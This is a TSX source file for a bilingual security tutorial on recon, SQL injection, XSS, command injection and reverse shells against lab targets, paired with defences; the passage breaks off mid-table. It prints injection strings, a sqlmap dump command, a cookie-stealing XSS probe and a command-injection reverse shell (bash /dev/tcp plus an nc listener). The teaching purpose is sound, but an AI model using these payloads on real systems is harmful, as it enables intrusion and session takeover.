import { Callout, CodeBlock, Diagram, Section, Sources, T, Table } from "../../components/note/index.ts";
import type { Note } from "../types.ts";

export const note: Note = {
  slug: "web-host-attack-defense",
  title: { en: "Web and host attack and defence: SQL injection, XSS, shells, hardening", pt: "Ataque e defesa web e de servidor: SQL injection, XSS, shells, hardening" },
  seo: {
    title: { en: "Web and host attack and defence: SQL injection, XSS, shells, hardening", pt: "Ataque e defesa web e de servidor: SQL injection, XSS, shells, hardening" },
    description: { en: "The attack lifecycle in a Docker lab (DVWA, Juice Shop): recon, SQL injection, XSS, command injection and reverse shells, each paired with its defence, plus Linux host hardening and what the blue team sees.", pt: "O ciclo de ataque num laboratório Docker (DVWA, Juice Shop): recon, SQL injection, XSS, injeção de comando e shells reversos, cada um com a sua defesa, mais hardening de servidor Linux e o que o blue team enxerga." },
  },
  summary: "the attack lifecycle in a Docker lab (DVWA, Juice Shop): recon, SQL injection, XSS, command injection and reverse shells, each with its defence, plus Linux host hardening and the traces the blue team sees.",
  kicker: { en: "Hands-on lab", pt: "Laboratório prático" },
  heroTitle: { en: <>Web and host attacks, <em>and the defence for each.</em></>, pt: <>Ataques web e de servidor, <em>e a defesa de cada um.</em></> },
  heroLede: { en: "Recon, SQL injection, XSS, command injection and reverse shells in a safe Docker lab, then the fixes, the host hardening and the log traces that turn each attack into a detection.", pt: "Recon, SQL injection, XSS, injeção de comando e shells reversos num laboratório Docker seguro, depois as correções, o hardening do servidor e os rastros nos logs que transformam cada ataque em detecção." },
  published: "2026-10-23",
  updated: "2026-10-23",
  toc: [
    {
      items: [
        { id: "intro-rt", title: <T pt="Antes de começar: o ciclo e o laboratório" en="Before you start: the lifecycle and the lab" /> },
        { id: "recon-rt", title: <T pt="Reconhecimento: mapear antes de tocar" en="Recon: mapping before touching" /> },
        { id: "exploitation", title: <T pt="Exploração: SQL injection e XSS" en="Exploitation: SQL injection and XSS" /> },
        { id: "shell", title: <T pt="Do comando ao shell: o que vem depois" en="From command to shell: what comes next" /> },
        { id: "blue-view", title: <T pt="O outro lado: o que o blue team enxerga" en="The other side: what the blue team sees" /> },
        { id: "hardening", title: <T pt="Hardening do servidor: fechar antes de alguém abrir" en="Server hardening: close it before someone opens it" /> },
        { id: "cheat-rt", title: <T pt="Cola e revisão" en="Cheat sheet and review" /> },
      ],
    },
  ],
  Body,
};

function Body() {
  return (
    <>
      <Section id="intro-rt" title={<T pt="Antes de começar: o ciclo e o laboratório" en="Before you start: the lifecycle and the lab" />}>
        <p><T pt={<>"Red team" é o time que ataca de propósito, com contrato e limites claros, para encontrar falhas antes de quem não tem boas intenções encontrar. Esta nota cobre o lado técnico desse trabalho contra aplicações web e servidores: as fases de um ataque, uma ferramenta ou técnica típica de cada uma, e — tão importante quanto — a defesa que neutraliza cada uma delas. Tudo aqui roda contra alvos de laboratório que você mesmo sobe em Docker, nunca contra sistemas de terceiros. O lado humano do ataque (engenharia social, phishing) tem a sua própria nota: <a href="/notas/social-engineering/">Engenharia social: ataque e defesa</a>.</>} en={<>"Red team" is the group that attacks on purpose, under contract and clear boundaries, to find flaws before someone without good intentions does. This note covers the technical side of that work against web applications and servers: the phases of an attack, a typical tool or technique for each, and — just as important — the defence that neutralises each one. Everything here runs against lab targets you spin up yourself in Docker, never against someone else's systems. The human side of the attack (social engineering, phishing) has its own note: <a href="/notas/social-engineering/">Social engineering: attack and defence</a>.</>} /></p>
        <Callout tone="warn" icon="alert"><T pt={"Isto não é um manual de invasão: é um mapa, no nível de uma certificação como CompTIA Security+/PenTest+ ou de um curso introdutório de OSCP/eJPT. As técnicas citadas são de conhecimento público (MITRE ATT&CK, OWASP) e os laboratórios usam alvos feitos de propósito para serem atacados (DVWA, Metasploitable, Juice Shop). Testar qualquer uma delas fora de um laboratório seu, ou sem um contrato de pentest assinado, pode ser crime — mesmo \"só para ver se funciona\"."} en={"This is not a how-to-break-in manual: it is a map, at the level of a CompTIA Security+/PenTest+ certification or an introductory OSCP/eJPT course. The techniques named are public knowledge (MITRE ATT&CK, OWASP) and the labs use targets built on purpose to be attacked (DVWA, Metasploitable, Juice Shop). Trying any of this outside a lab of your own, or without a signed pentest contract, can be a crime — even \"just to see if it works\"."} /></Callout>
        <Callout icon="check"><T pt={<>Onde esta nota se encaixa: é a <strong>etapa 2</strong> da <a href="/notas/cybersecurity-for-devs/">trilha de cibersegurança para quem programa</a>. Antes dela, faça a <a href="/notas/network-attack-defense/">nota de ataque e defesa em redes</a> (nmap, Wireshark, firewall) e a <a href="/notas/web-app-security/">nota de aplicações web seguras</a>; depois dela, feche o ciclo na seção "O outro lado" daqui e nos projetos de detecção da trilha.</>} en={<>Where this note fits: it is <strong>stage 2</strong> of the <a href="/notas/cybersecurity-for-devs/">cybersecurity path for developers</a>. Before it, do the <a href="/notas/network-attack-defense/">network attack and defence note</a> (nmap, Wireshark, firewall) and the <a href="/notas/web-app-security/">secure web apps note</a>; after it, close the loop in the "The other side" section below and in the path's detection projects.</>} /></Callout>
        <h3><T pt="O ciclo de um ataque" en="The attack lifecycle" /></h3>
        <Diagram minWidth={700} caption={<T pt="Cada seção desta nota cobre um elo desta cadeia, com o conceito, um laboratório seguro e a defesa." en="Each section of this note covers one link of this chain, with the concept, a safe lab and the defence." />}>
          <svg viewBox="0 0 812 120" role="img" aria-label="A cadeia de ataque / The attack chain">
            <rect x="10" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="58" y="43" className="" textAnchor="middle">Recon</text>
            <path d="M106 38L126 38" className="ln" />
            <path d="M119.2 34.7L126 38L119.2 41.3" className="ln" />
            <rect x="126" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="174" y="35" className="pt" textAnchor="middle">Acesso</text>
            <text x="174" y="35" className="en" textAnchor="middle">Initial</text>
            <text x="174" y="52" className="pt" textAnchor="middle">inicial</text>
            <text x="174" y="52" className="en" textAnchor="middle">access</text>
            <path d="M222 38L242 38" className="ln" />
            <path d="M235.2 34.7L242 38L235.2 41.3" className="ln" />
            <rect x="242" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="290" y="43" className="pt" textAnchor="middle">Execução</text>
            <text x="290" y="43" className="en" textAnchor="middle">Execution</text>
            <path d="M338 38L358 38" className="ln" />
            <path d="M351.2 34.7L358 38L351.2 41.3" className="ln" />
            <rect x="358" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="406" y="35" className="pt" textAnchor="middle">Escalada de</text>
            <text x="406" y="35" className="en" textAnchor="middle">Privilege</text>
            <text x="406" y="52" className="pt" textAnchor="middle">privilégio</text>
            <text x="406" y="52" className="en" textAnchor="middle">escalation</text>
            <path d="M454 38L474 38" className="ln" />
            <path d="M467.2 34.7L474 38L467.2 41.3" className="ln" />
            <rect x="474" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="522" y="43" className="pt" textAnchor="middle">Persistência</text>
            <text x="522" y="43" className="en" textAnchor="middle">Persistence</text>
            <path d="M570 38L590 38" className="ln" />
            <path d="M583.2 34.7L590 38L583.2 41.3" className="ln" />
            <rect x="590" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="638" y="35" className="pt" textAnchor="middle">Movimento</text>
            <text x="638" y="35" className="en" textAnchor="middle">Lateral</text>
            <text x="638" y="52" className="pt" textAnchor="middle">lateral</text>
            <text x="638" y="52" className="en" textAnchor="middle">movement</text>
            <path d="M686 38L706 38" className="ln" />
            <path d="M699.2 34.7L706 38L699.2 41.3" className="ln" />
            <rect x="706" y="10" width="96" height="56" rx="4" className="ln fillsoft" />
            <text x="754" y="43" className="pt" textAnchor="middle">Exfiltração</text>
            <text x="754" y="43" className="en" textAnchor="middle">Exfiltration</text>
            <text x="10" y="100" className="pt mut" textAnchor="start">Baseado nas táticas do MITRE ATT&amp;CK — o catálogo público de técnicas usado por ofensiva e defesa.</text>
            <text x="10" y="100" className="en mut" textAnchor="start">Based on MITRE ATT&amp;CK tactics — the public technique catalogue used by both offence and defence.</text>
          </svg>
        </Diagram>
        <h3><T pt="O laboratório: tudo em Docker, isolado" en="The lab: all in Docker, isolated" /></h3>
        <p><T pt={<>Os exercícios usam três alvos de treino bem conhecidos, cada um feito de propósito para ter falhas: <strong>DVWA</strong> (Damn Vulnerable Web Application), <strong>OWASP Juice Shop</strong> e <strong>Metasploitable2</strong>. Uma rede Docker própria os isola da sua rede real — releia a seção de Docker da nota de segurança e redes antes de começar, se ainda não viu como a rede de contêineres funciona.</>} en={<>The exercises use three well-known training targets, each built on purpose to have flaws: <strong>DVWA</strong> (Damn Vulnerable Web Application), <strong>OWASP Juice Shop</strong> and <strong>Metasploitable2</strong>. A Docker network of its own isolates them from your real network — re-read the Docker section of the security and networking note first if you have not seen how container networking works.</>} /></p>
        <CodeBlock>
          {"mkdir lab-redteam && cd lab-redteam\n"}
          {"cat > docker-compose.yml <<"}<span className="tok-s">'EOF'</span>{"\n"}
          {"services:\n"}
          {"  dvwa:\n"}
          {"    image: vulnerables/web-dvwa\n"}
          {"    ports: ["}<span className="tok-s">"127.0.0.1:8081:80"</span>{"]     "}<span className="tok-c"># só no seu localhost, nunca 0.0.0.0</span>{"\n"}
          {"    networks: [lab]\n"}
          {"  juice-shop:\n"}
          {"    image: bkimminich/juice-shop\n"}
          {"    ports: ["}<span className="tok-s">"127.0.0.1:8082:3000"</span>{"]\n"}
          {"    networks: [lab]\n"}
          {"  kali:\n"}
          {"    image: kalilinux/kali-rolling\n"}
          {"    command: sleep infinity\n"}
          {"    networks: [lab]\n"}
          {"networks:\n"}
          {"  lab:\n"}
          {"    driver: bridge\n"}
          {"EOF\n"}
          {"docker compose up -d\n"}
          {"docker compose exec kali bash -c "}<span className="tok-s">"apt update &amp;&amp; apt install -y nmap curl netcat-traditional sqlmap"</span>{"\n"}
          {"docker compose exec kali nmap -sV dvwa juice-shop   "}<span className="tok-c"># confirma que os dois alvos estão de pé</span>
        </CodeBlock>
        <p><T pt={<><strong>Resultado esperado:</strong> o nmap mostra a porta 80 (DVWA) e 3000 (Juice Shop) abertas, com os respectivos servidores web identificados. As portas publicadas (<code>-p</code>) ficam só em <code>127.0.0.1</code>: nada disso fica acessível de fora do seu computador.</>} en={<><strong>Expected result:</strong> nmap shows port 80 (DVWA) and 3000 (Juice Shop) open, with their web servers identified. The published ports are bound only to <code>127.0.0.1</code>: none of this is reachable from outside your computer.</>} /></p>
      </Section>
      <Section id="recon-rt" title={<T pt="Reconhecimento: mapear antes de tocar" en="Recon: mapping before touching" />}>
        <p><T pt={<>Antes de atacar qualquer coisa, um red team levanta o máximo de informação possível sem tocar no alvo diretamente (<em>recon passivo</em>) e só depois toca de leve para confirmar (<em>recon ativo</em>, como o nmap que você já viu).</>} en={<>Before attacking anything, a red team gathers as much information as possible without touching the target directly (<em>passive recon</em>), and only afterwards touches it lightly to confirm (<em>active recon</em>, like the nmap you already saw).</>} /></p>
        <Table
          head={[<T pt="Técnica" en="Technique" />, <T pt="O que revela" en="What it reveals" />, <T pt="Ferramenta típica" en="Typical tool" />]}
          rows={[
            [<T pt="WHOIS e DNS" en="WHOIS and DNS" />, <T pt="dono do domínio, servidores de e-mail, subdomínios" en="domain owner, mail servers, subdomains" />, <><code>whois</code>, <code>dig</code></>],
            [<T pt="Motores de busca especializados" en="Specialised search engines" />, <T pt="dispositivos e serviços expostos na internet, por empresa/país" en="devices and services exposed on the internet, by company/country" />, "Shodan, Censys"],
            [<T pt="Metadados de arquivos públicos" en="Metadata in public files" />, <T pt="nomes de funcionários, software usado, caminhos internos, em PDFs/DOCX do site" en="employee names, software used, internal paths, in the site's PDFs/DOCX" />, "exiftool"],
            [<T pt="Redes sociais e vazamentos públicos" en="Social media and public breach data" />, <T pt="e-mails, cargos, senhas reutilizadas de vazamentos antigos (para phishing e senha)" en="emails, job titles, reused passwords from old breaches (for phishing and passwords)" />, "LinkedIn, Have I Been Pwned"],
            [<T pt="Enumeração de subdomínios" en="Subdomain enumeration" />, <T pt="mais superfície de ataque do que o site principal sugere" en="more attack surface than the main site suggests" />, "amass, subfinder"],
          ]}
        />
        <h3><T pt="Um script simples de enumeração" en="A simple enumeration script" /></h3>
        <p><T pt="Os times profissionais usam ferramentas prontas (amass, subfinder); entender o script por trás ajuda a saber o que elas realmente fazem." en="Professional teams use ready-made tools (amass, subfinder); understanding the script behind them helps you know what they actually do." /></p>
        <CodeBlock>
          <span className="tok-c">#!/usr/bin/env python3</span>{"\n"}
          <span className="tok-c"># enum_subdominios.py — tenta resolver cada nome de uma lista contra um domínio.</span>{"\n"}
          <span className="tok-c"># Uso educacional: rode só contra domínios SEUS ou de laboratório (ex.: um domínio de teste seu).</span>{"\n"}
          {"import socket\n"}
          {"import sys\n"}
          {"\n"}
          {"dominio = sys.argv[1]                     "}<span className="tok-c"># ex.: meulab.test</span>{"\n"}
          {"palavras = ["}<span className="tok-s">"www"</span>{", "}<span className="tok-s">"api"</span>{", "}<span className="tok-s">"dev"</span>{", "}<span className="tok-s">"staging"</span>{", "}<span className="tok-s">"vpn"</span>{", "}<span className="tok-s">"mail"</span>{", "}<span className="tok-s">"admin"</span>{"]\n"}
          {"\n"}
          {"for palavra in palavras:\n"}
          {"    alvo = f"}<span className="tok-s">"&#123;palavra&#125;.&#123;dominio&#125;"</span>{"\n"}
          {"    try:\n"}
          {"        ip = socket.gethostbyname(alvo)\n"}
          {"        print(f"}<span className="tok-s">"&#123;alvo&#125; -&gt; &#123;ip&#125;"</span>{")\n"}
          {"    except socket.gaierror:\n"}
          {"        pass                               "}<span className="tok-c"># não existe; segue para o próximo</span>
        </CodeBlock>
        <p><T pt={<><strong>Resultado esperado:</strong> uma lista de subdomínios que de fato resolvem para um IP, a partir de uma lista de palavras comuns — a mesma lógica, só que com listas de milhares de palavras e em paralelo, por trás de ferramentas como o <code>amass</code>.</>} en={<><strong>Expected result:</strong> a list of subdomains that actually resolve to an IP, from a list of common words — the same logic, just with lists of thousands of words and running in parallel, behind tools like <code>amass</code>.</>} /></p>
        <h3><T pt="Defesa: reduzir o que existe para ser encontrado" en="Defence: shrink what there is to find" /></h3>
        <ul className="ds-list">
          <li><T pt="Inventário de ativos: você só protege o que sabe que existe. Mantenha um inventário de domínios, subdomínios e serviços expostos — é também o que o atacante está tentando reconstruir." en="Asset inventory: you only protect what you know exists. Keep an inventory of domains, subdomains and exposed services — it is also what the attacker is trying to reconstruct." /></li>
          <li><T pt="Remova metadados de arquivos publicados (muitas suítes de escritório fazem isso ao exportar para PDF)." en="Strip metadata from published files (many office suites do this on PDF export)." /></li>
          <li><T pt="Monitore menções e vazamentos da sua organização (Have I Been Pwned tem uma API para domínios inteiros)." en="Monitor mentions and leaks of your organisation (Have I Been Pwned has an API for whole domains)." /></li>
          <li><T pt={"Desative subdomínios e serviços que não são mais usados; um \"dev.empresa.com\" esquecido costuma ter a configuração mais fraca de todas."} en={"Disable subdomains and services no longer in use; a forgotten \"dev.company.com\" usually has the weakest configuration of all."} /></li>
        </ul>
      </Section>
      <Section id="exploitation" title={<T pt="Exploração: SQL injection e XSS" en="Exploitation: SQL injection and XSS" />}>
        <p><T pt={<>"Exploração" é usar uma falha específica para fazer um sistema fazer algo que não deveria. A grande maioria das falhas exploradas em aplicações web cabe nas categorias do <a href="https://owasp.org/www-project-top-ten/" rel="noopener">OWASP Top 10</a>, a lista mais citada do setor. Os dois exemplos abaixo rodam contra o DVWA do laboratório desta nota (nível de segurança "low", de propósito).</>} en={<>"Exploitation" is using a specific flaw to make a system do something it should not. The vast majority of flaws exploited in web applications fall into the categories of the <a href="https://owasp.org/www-project-top-ten/" rel="noopener">OWASP Top 10</a>, the industry's most-cited list. The two examples below run against this note's lab DVWA (security level "low", on purpose).</>} /></p>
        <h3><T pt="SQL injection: a consulta que você não escreveu" en="SQL injection: the query you did not write" /></h3>
        <p><T pt="Quando uma aplicação cola a entrada do usuário direto dentro de uma consulta SQL, em vez de tratá-la como um VALOR, o usuário pode mudar a estrutura da consulta. É a falha mais didática que existe, e ainda uma das mais comuns em código legado." en="When an application pastes user input straight into a SQL query, instead of treating it as a VALUE, the user can change the query's structure. It is the most teachable flaw there is, and still one of the most common in legacy code." /></p>
        <CodeBlock>
          <span className="tok-c">-- o que o formulário de login do DVWA MONTA por baixo (vulnerável)</span>{"\n"}
          <span className="tok-k">SELECT</span>{" * "}<span className="tok-k">FROM</span>{" users "}<span className="tok-k">WHERE</span>{" username = "}<span className="tok-s">'$usuario'</span>{" "}<span className="tok-k">AND</span>{" "}<span className="tok-k">password</span>{" = "}<span className="tok-s">'$senha'</span>{";\n"}
          {"\n"}
          <span className="tok-c">-- se você digitar isto no campo "usuario":</span>{"\n"}
          <span className="tok-s">' OR '</span><span className="tok-n">1</span><span className="tok-s">'='</span><span className="tok-n">1</span>{"\n"}
          {"\n"}
          <span className="tok-c">-- a consulta vira:</span>{"\n"}
          <span className="tok-k">SELECT</span>{" * "}<span className="tok-k">FROM</span>{" users "}<span className="tok-k">WHERE</span>{" username = "}<span className="tok-s">''</span>{" "}<span className="tok-k">OR</span>{" "}<span className="tok-s">'1'</span>{"="}<span className="tok-s">'1'</span>{" "}<span className="tok-k">AND</span>{" "}<span className="tok-k">password</span>{" = "}<span className="tok-s">'...'</span>{";\n"}
          <span className="tok-c">-- '1'='1' é sempre verdadeiro: a condição inteira vira verdadeira, login sem senha certa</span>
        </CodeBlock>
        <p><T pt={<>No DVWA (módulo "SQL Injection", nível low), digite <code>1 OR 1=1</code> no campo de busca por ID de usuário. <strong>Resultado esperado:</strong> em vez de um usuário, a consulta retorna TODOS — a mesma lógica do exemplo acima, mas lendo dados em vez de pular uma senha.</>} en={<>In DVWA ("SQL Injection" module, low level), type <code>1 OR 1=1</code> in the user-ID search field. <strong>Expected result:</strong> instead of one user, the query returns ALL of them — the same logic as the example above, but reading data instead of skipping a password.</>} /></p>
        <CodeBlock>
          <span className="tok-c"># a mesma falha, encontrada automaticamente (ferramenta padrão do setor)</span>{"\n"}
          {"docker compose exec kali sqlmap -u "}<span className="tok-s">"http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span>{" \\\n"}
          {"  --cookie="}<span className="tok-s">"PHPSESSID=&lt;copie do navegador&gt;; security=low"</span>{" --batch --dump"}
        </CodeBlock>
        <Callout icon="check"><T pt={<><code>sqlmap</code> automatiza exatamente esse raciocínio: testa dezenas de variações da injeção até achar uma que funcione. É a ferramenta padrão de pentest para esse tipo de falha — e também o que um time de defesa roda contra a própria aplicação antes de ela ir para produção.</>} en={<><code>sqlmap</code> automates exactly this reasoning: it tries dozens of injection variants until one works. It is the standard pentest tool for this kind of flaw — and also what a defence team runs against its own application before it goes to production.</>} /></Callout>
        <h3><T pt="Cross-site scripting (XSS): a entrada que vira código" en="Cross-site scripting (XSS): input that becomes code" /></h3>
        <p><T pt="Se a aplicação devolve a entrada do usuário para a página HTML sem tratar, o navegador de QUEM VISUALIZAR executa o que foi digitado. No Juice Shop, procure um campo de busca ou comentário e tente:" en="If the application echoes user input back into the HTML page without treating it, the browser of WHOEVER VIEWS IT executes what was typed. In Juice Shop, find a search or comment field and try:" /></p>
        <CodeBlock code={`<script>alert(document.cookie)</script>`} />
        <p><T pt={<><strong>Resultado esperado:</strong> uma caixa de alerta aparece mostrando o cookie da sessão — prova de que o navegador executou código que veio de um campo de texto. Num ataque real, em vez de <code>alert()</code>, esse script manda o cookie para um servidor do atacante, que o usa para assumir a sessão da vítima sem saber a senha dela.</>} en={<><strong>Expected result:</strong> an alert box appears showing the session cookie — proof the browser executed code that came from a text field. In a real attack, instead of <code>alert()</code>, that script sends the cookie to an attacker's server, who uses it to take over the victim's session without knowing their password.</>} /></p>
        <h3><T pt="Defesa: tratar toda entrada como hostil" en="Defence: treat all input as hostile" /></h3>
        <Table
          head={[<T pt="Falha" en="Flaw" />, <T pt="Defesa principal" en="Main defence" />]}
          rows={[
            [<T pt="SQL injection" en="SQL injection" />, <T pt="consultas parametrizadas / prepared statements (NUNCA concatenar texto do usuário no SQL) — veja a nota de Postgres" en="parameterised queries / prepared statements (NEVER concatenate user text into SQL) — see the Postgres note" />],
            [<T pt="XSS" en="XSS" />, <T pt="escapar toda saída por padrão (a maioria dos frameworks modernos já faz isso) + um Content-Security-Policy restritivo" en="escape all output by default (most modern frameworks already do this) + a strict Content-Security-Policy" />],
            [<T pt="Ambas" en="Both" />, <T pt="validação de entrada no servidor (nunca só no navegador), princípio do menor privilégio no usuário do banco, scanner de dependências/SAST no CI" en="server-side input validation (never only in the browser), least privilege on the database user, a dependency/SAST scanner in CI" />],
            [<T pt="Geral" en="General" />, <T pt="um WAF (Web Application Firewall) como camada extra — nunca a única" en="a WAF (Web Application Firewall) as an extra layer — never the only one" />],
          ]}
        />
      </Section>
      <Section id="shell" title={<T pt="Do comando ao shell: o que vem depois" en="From command to shell: what comes next" />}>
        <p><T pt={<>Quando uma falha permite executar comandos no servidor (não só ler dados), o próximo passo típico é abrir um <em>shell reverso</em>: o servidor vulnerável se conecta DE VOLTA para uma máquina do atacante, que fica ouvindo numa porta. "Reverso" porque é o alvo que inicia a conexão — o que costuma atravessar firewalls configurados só para bloquear conexões de ENTRADA.</>} en={<>When a flaw allows running commands on the server (not just reading data), the typical next step is opening a <em>reverse shell</em>: the vulnerable server connects BACK to an attacker machine, which is listening on a port. "Reverse" because the target initiates the connection — which tends to sail through firewalls configured only to block INBOUND connections.</>} /></p>
        <Diagram minWidth={560} caption={<T pt={"A lógica de um shell reverso: o \"ataque\" é convencer o alvo a rodar o comando de conexão."} en={"The logic of a reverse shell: the \"attack\" is convincing the target to run the connect-back command."} />}>
          <svg viewBox="0 0 600 165" role="img" aria-label="Shell reverso / Reverse shell">
            <rect x="10" y="40" width="200" height="60" rx="4" className="ln fillsoft" />
            <text x="110" y="66" className="pt" textAnchor="middle">seu "kali" (ouvindo)</text>
            <text x="110" y="66" className="en" textAnchor="middle">your "kali" (listening)</text>
            <text x="110" y="84" className="mut mono" textAnchor="middle">nc -lvnp 4444</text>
            <rect x="400" y="40" width="190" height="60" rx="4" className="ln" />
            <text x="495" y="66" className="pt" textAnchor="middle">DVWA (vulnerável)</text>
            <text x="495" y="66" className="en" textAnchor="middle">DVWA (vulnerable)</text>
            <text x="495" y="84" className="pt mut mono" textAnchor="middle">campo de comando</text>
            <text x="495" y="84" className="en mut mono" textAnchor="middle">command field</text>
            <path d="M400 70L210 70" className="ln" />
            <path d="M216.8 73.3L210 70L216.8 66.7" className="ln" />
            <text x="305" y="60" className="pt mut" textAnchor="middle">conecta de volta</text>
            <text x="305" y="60" className="en mut" textAnchor="middle">connects back</text>
            <text x="10" y="130" className="pt mut" textAnchor="start">O alvo INICIA a conexão para você; muitos firewalls só filtram</text>
            <text x="10" y="130" className="en mut" textAnchor="start">The target INITIATES the connection to you; many firewalls only filter</text>
            <text x="10" y="148" className="pt mut" textAnchor="start">quem tenta entrar, não quem tenta sair.</text>
            <text x="10" y="148" className="en mut" textAnchor="start">inbound attempts, not outbound ones.</text>
          </svg>
        </Diagram>
        <h3><T pt="Exercício: do campo de comando ao shell" en="Exercise: from the command field to a shell" /></h3>
        <CodeBlock>
          <span className="tok-c"># 1. no seu "kali" (laboratório): abra um ouvinte</span>{"\n"}
          {"docker compose exec kali nc -lvnp 4444\n"}
          {"\n"}
          <span className="tok-c"># 2. no DVWA (módulo "Command Injection", nível low), no campo que pede um IP para "ping",</span>{"\n"}
          <span className="tok-c"># digite (troque pelo IP do container kali: docker inspect lab-redteam-kali-1):</span>{"\n"}
          {"127.0.0.1; bash -c "}<span className="tok-s">'bash -i &gt;&amp; /dev/tcp/IP_DO_KALI/4444 0&gt;&amp;1'</span>
        </CodeBlock>
        <p><T pt={<><strong>Resultado esperado:</strong> o terminal do <code>nc</code> no kali ganha um prompt interativo DENTRO do contêiner do DVWA — digite <code>whoami</code> ou <code>id</code> e veja o usuário do servidor web respondendo, como se você tivesse um terminal lá. É exatamente assim que um "ponto de apoio" inicial vira controle de um sistema.</>} en={<><strong>Expected result:</strong> the <code>nc</code> terminal on kali gets an interactive prompt INSIDE the DVWA container — type <code>whoami</code> or <code>id</code> and see the web server's user answer, as if you had a terminal there. This is exactly how an initial "foothold" becomes control of a system.</>} /></p>
        <h3><T pt="Depois do shell: o que um atacante faria" en="After the shell: what an attacker would do" /></h3>
        <Table
          head={[<T pt="Fase" en="Phase" />, <T pt="Ideia" en="Idea" />, <T pt="Ferramenta citada (sem instruções)" en="Tool named (no instructions)" />]}
          rows={[
            [<T pt="Escalada de privilégio" en="Privilege escalation" />, <T pt="procurar binários SUID, cron jobs mal configurados, senhas em arquivos — veja a nota de Linux, seção de permissões" en="looking for SUID binaries, misconfigured cron jobs, passwords in files — see the Linux note, permissions section" />, "linPEAS"],
            [<T pt="Persistência" en="Persistence" />, <T pt="deixar uma forma de voltar depois (uma chave SSH extra, um serviço, uma tarefa agendada)" en="leaving a way back later (an extra SSH key, a service, a scheduled task)" />, "—"],
            [<T pt="Movimento lateral" en="Lateral movement" />, <T pt={<>usar o host comprometido como ponte para alcançar outras máquinas da mesma rede interna (o mesmo princípio do <code>ssh -D</code> da nota de segurança e redes)</>} en={<>using the compromised host as a bridge to reach other machines on the same internal network (the same idea as <code>ssh -D</code> in the security and networking note)</>} />, "proxychains"],
            [<T pt="Comando e controle (C2)" en="Command and control (C2)" />, <T pt={<>em vez de um <code>nc</code> simples, um framework cifrado, resiliente a quedas, para controlar vários hosts de uma vez</>} en={<>instead of plain <code>nc</code>, an encrypted, drop-resilient framework to control several hosts at once</>} />, "Metasploit, Sliver, Cobalt Strike"],
            [<T pt="Exfiltração" en="Exfiltration" />, <T pt="copiar dados para fora, muitas vezes disfarçados de tráfego comum (DNS, HTTPS)" en="copying data out, often disguised as ordinary traffic (DNS, HTTPS)" />, "—"],
          ]}
        />
        <Callout tone="warn" icon="alert"><T pt="Esta tabela é um mapa de conceitos, de propósito sem comandos prontos para as fases depois do shell — são exatamente as etapas que mais dependem do alvo específico, e as mais fáceis de usar mal fora de um contrato de pentest. Para praticar de verdade e com segurança, plataformas como TryHackMe e Hack The Box (já citadas na nota de segurança e redes) têm máquinas inteiras desenhadas para isso." en="This table is a map of concepts, deliberately without ready-made commands for the phases after the shell — these are exactly the steps that depend most on the specific target, and the easiest to misuse outside a pentest contract. To practise for real and safely, platforms like TryHackMe and Hack The Box (already named in the security and networking note) have whole machines designed for this." /></Callout>
        <h3><T pt="Defesa: supor que alguém vai conseguir um shell" en="Defence: assume someone will get a shell" /></h3>
        <Table
          head={[<T pt="Controle" en="Control" />, <T pt="Reduz" en="Reduces" />]}
          rows={[
            [<T pt="Filtragem de saída (egress filtering)" en="Egress filtering" />, <T pt="um shell reverso precisa que o SERVIDOR consiga abrir uma conexão de saída não usual — bloqueie isso por padrão" en="a reverse shell needs the SERVER to open an unusual outbound connection — block that by default" />],
            [<T pt="Princípio do menor privilégio" en="Least privilege" />, <T pt="o usuário que roda a aplicação web não deveria ter permissão de executar comandos do sistema" en="the user running the web application should not have permission to run system commands" />],
            [<T pt="EDR / monitoramento de processos" en="EDR / process monitoring" />, <T pt={<>alerta quando um processo de servidor web gera um shell filho (<code>bash</code>, <code>sh</code>, <code>powershell</code>) — um padrão muito incomum e muito usado para detecção</>} en={<>alerts when a web server process spawns a child shell (<code>bash</code>, <code>sh</code>, <code>powershell</code>) — a very unusual pattern and a common detection signature</>} />],
            [<T pt="Segmentação de rede" en="Network segmentation" />, <T pt={"limita até onde um host comprometido consegue \"andar\" (movimento lateral)"} en={"limits how far a compromised host can \"walk\" (lateral movement)"} />],
            [<T pt="Backups testados e offline" en="Tested, offline backups" />, <T pt="reduz o impacto se tudo mais falhar — veja a regra 3-2-1 na nota de Postgres" en="reduces the impact if everything else fails — see the 3-2-1 rule in the Postgres note" />],
          ]}
        />
      </Section>
      <Section id="blue-view" title={<T pt="O outro lado: o que o blue team enxerga" en="The other side: what the blue team sees" />}>
        <p><T pt={<>Cada fase do ciclo deixa um rastro, e é nele que o time de defesa (blue team) trabalha. Quem entende só o ataque conhece metade do jogo: o ofício completo é saber o que o ataque faz <em>e</em> onde isso aparece. A tabela abaixo é o elo entre esta nota e a parte defensiva da trilha.</>} en={<>Every phase of the lifecycle leaves a trace, and that is where the defending team (blue team) works. Knowing only the attack is half the game: the full craft is knowing what the attack does <em>and</em> where it shows up. The table below is the link between this note and the defensive part of the path.</>} /></p>
        <Table
          head={[<T pt="Fase" en="Phase" />, <T pt="O rastro que fica" en="The trace it leaves" />, <T pt="Onde aparece" en="Where it shows up" />]}
          rows={[
            ["Recon", <T pt="um scan de portas: muitas tentativas de conexão a portas diferentes, vindas de um IP, em poucos segundos; enumeração web: dezenas de 404 seguidos com o user-agent de uma ferramenta" en="a port scan: many connection attempts to different ports from one IP within seconds; web enumeration: dozens of 404s in a row with a tool's user-agent" />, <T pt="logs de firewall, IDS (Suricata) e log de acesso do servidor web" en="firewall logs, IDS (Suricata) and the web server access log" />],
            ["Engenharia social", <T pt="um link clicado e, em seguida, um login de um IP ou país incomum; vários pedidos de MFA seguidos (fadiga de MFA)" en="a clicked link and then a login from an unusual IP or country; several MFA prompts in a row (MFA fatigue)" />, <T pt="logs do provedor de identidade e do e-mail; denúncias dos próprios usuários" en="identity provider and email logs; reports from the users themselves" />],
            ["SQL injection e XSS", <T pt={<>parâmetros com aspas, <code>UNION SELECT</code> ou <code>&lt;script&gt;</code> no log de acesso; picos de erro 500 vindos do banco</>} en={<>parameters with quotes, <code>UNION SELECT</code> or <code>&lt;script&gt;</code> in the access log; spikes of 500 errors from the database</>} />, <T pt="log de acesso, log da aplicação, WAF (por exemplo, ModSecurity com o OWASP CRS)" en="access log, application log, WAF (for example ModSecurity with the OWASP CRS)" />],
